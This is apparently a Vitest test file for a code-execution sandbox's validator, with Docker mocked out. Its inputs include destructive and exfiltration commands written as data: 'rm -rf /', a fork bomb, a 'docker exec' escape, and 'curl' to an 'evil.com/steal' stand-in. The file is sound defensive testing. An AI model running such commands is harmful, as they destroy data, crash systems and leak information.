import { describe, it, expect, vi, beforeEach } from 'vitest';
import { SandboxManager } from '../src/sandbox-manager.js';
import type { SandboxConfig } from '../src/types.js';

// Mock DockerExecutor to avoid needing Docker daemon
vi.mock('../src/docker-executor.js', () => {
  return {
    DockerExecutor: vi.fn().mockImplementation(() => ({
      executePython: vi.fn().mockResolvedValue({
        success: true,
        stdout: 'hello from python',
        stderr: '',
        exitCode: 0,
        durationMs: 50,
        timedOut: false,
        oomKilled: false,
      }),
      executeNode: vi.fn().mockResolvedValue({
        success: true,
        stdout: 'hello from node',
        stderr: '',
        exitCode: 0,
        durationMs: 40,
        timedOut: false,
        oomKilled: false,
      }),
      executePythonFile: vi.fn().mockResolvedValue({
        success: true,
        stdout: 'file output',
        stderr: '',
        exitCode: 0,
        durationMs: 60,
        timedOut: false,
        oomKilled: false,
      }),
      executeNodeFile: vi.fn().mockResolvedValue({
        success: true,
        stdout: 'node file output',
        stderr: '',
        exitCode: 0,
        durationMs: 55,
        timedOut: false,
        oomKilled: false,
      }),
    })),
  };
});

describe('SandboxManager', () => {
  let manager: SandboxManager;

  beforeEach(() => {
    vi.clearAllMocks();
    manager = new SandboxManager();
  });

  // ── validateCode tests ──────────────────────────────────────

  it('should validate safe code as safe', () => {
    const result = manager.validateCode('print("hello")');
    expect(result.safe).toBe(true);
    expect(result.issues.length).toBe(0);
  });

  it('should detect empty code', () => {
    const result = manager.validateCode('');
    expect(result.safe).toBe(false);
    expect(result.issues).toContain('Empty code block');
  });

  it('should detect sudo usage', () => {
    const result = manager.validateCode('sudo rm -rf /');
    expect(result.safe).toBe(false);
    expect(result.issues.some((i) => i.includes('sudo'))).toBe(true);
  });

  it('should detect curl requests', () => {
    const result = manager.validateCode('curl https://evil.com/steal');
    expect(result.safe).toBe(false);
    expect(result.issues.some((i) => i.includes('curl'))).toBe(true);
  });

  it('should detect docker exec escape', () => {
    const result = manager.validateCode('docker exec container bash');
    expect(result.safe).toBe(false);
    expect(result.issues.some((i) => i.includes('Docker exec'))).toBe(true);
  });

  it('should detect recursive root deletion', () => {
    const result = manager.validateCode('rm -rf /');
    expect(result.safe).toBe(false);
    expect(result.issues.some((i) => i.includes('Recursive root'))).toBe(true);
  });

  it('should detect fork bomb pattern', () => {
    const result = manager.validateCode(':() { :|: & };:');
    expect(result.safe).toBe(false);
    expect(result.issues.some((i) => i.includes('Fork bomb'))).toBe(true);
  });

  it('should detect too-long code', () => {
    const longCode = 'x'.repeat(1_000_001);
    const result = manager.validateCode(longCode);
    expect(result.safe).toBe(false);
    expect(result.issues.some((i) => i.includes('maximum length'))).toBe(true);
  });

  // ── runCode tests ───────────────────────────────────────────

  it('should run Python code successfully', async () => {
    const result = await manager.runCode('print("hello")', 'python');
    expect(result.success).toBe(true);
    expect(result.stdout).toBe('hello from python');
    expect(result.exitCode).toBe(0);
  });

  it('should run Node.js code successfully', async () => {
    const result = await manager.runCode('console.log("hello")', 'node');
    expect(result.success).toBe(true);
    expect(result.stdout).toBe('hello from node');
    expect(result.exitCode).toBe(0);
  });

  it('should reject dangerous code before execution', async () => {
    const result = await manager.runCode('sudo whoami', 'python');
    expect(result.success).toBe(false);
    expect(result.exitCode).toBe(-1);
    expect(result.stderr).toContain('Code validation failed');
  });

  it('should skip validation when requested', async () => {
    const result = await manager.runCode('sudo whoami', 'python', { skipValidation: true });
    expect(result.success).toBe(true);
  });

  // ── runFile tests ───────────────────────────────────────────

  it('should detect Python files by extension', async () => {
    const result = await manager.runFile('test.py', 'print("hi")');
    expect(result.success).toBe(true);
    expect(result.stdout).toBe('file output');
  });

  it('should detect Node.js files by extension', async () => {
    const result = await manager.runFile('test.js', 'console.log("hi")');
    expect(result.success).toBe(true);
    expect(result.stdout).toBe('node file output');
  });

  it('should detect TypeScript files as Node.js', async () => {
    const result = await manager.runFile('test.ts', 'console.log("hi")');
    expect(result.success).toBe(true);
    expect(result.stdout).toBe('node file output');
  });

  it('should validate file content before execution', async () => {
    const result = await manager.runFile('test.py', 'import os; os.system("sudo ls")');
    expect(result.success).toBe(false);
    expect(result.stderr).toContain('Code validation failed');
  });
});
